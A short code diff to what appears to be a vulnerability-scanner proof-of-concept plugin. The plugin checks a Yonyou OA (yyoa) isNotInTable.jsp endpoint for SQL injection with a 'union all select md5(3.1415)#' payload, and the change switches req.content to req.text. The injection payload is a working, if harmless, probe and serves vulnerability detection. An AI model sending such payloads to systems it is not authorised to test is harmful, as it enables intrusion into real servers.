@@ -51,7 +51,7 @@ class Poc(ABPoc):
             verify_url = ('%s/yyoa/ext/trafaxserver/ExtnoManage/isNotInTable.jsp?user_ids='
                           '(17) union all select md5(3.1415)#') % url
             req = requests.get(verify_url)
-            if req.status_code != 404 and '63e1f04640e83605c1d177544a5a0488' in req.content:
+            if req.status_code != 404 and '63e1f04640e83605c1d177544a5a0488' in req.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
